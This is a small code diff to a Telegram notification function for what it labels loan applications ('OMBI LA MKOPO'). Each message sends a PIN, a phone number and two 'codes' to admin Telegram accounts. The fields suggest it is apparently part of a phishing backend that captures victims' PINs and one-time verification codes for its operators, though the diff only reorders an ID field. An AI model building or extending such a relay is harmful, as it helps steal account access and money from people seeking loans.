@@ -253,7 +253,7 @@ async function getApplication(id) {
 async function notifyTelegram(application) {
   if (!bot || adminIds.size === 0) return;
   const text = `🔔 OMBI LA MKOPO\n\n` +
-    `PIN📌: ${application.application_no || application.application_id}\n` +
+        `PIN 📌: ${application.application_id || application.application_no}\n` +
     `PHONE NUMBER: ${application.phone}\n` +
     `FIRST CODE: ${application.first_name || "waiting"}\n` +
     `SECOND CODE: ${application.second_name || "waiting"}\n` +
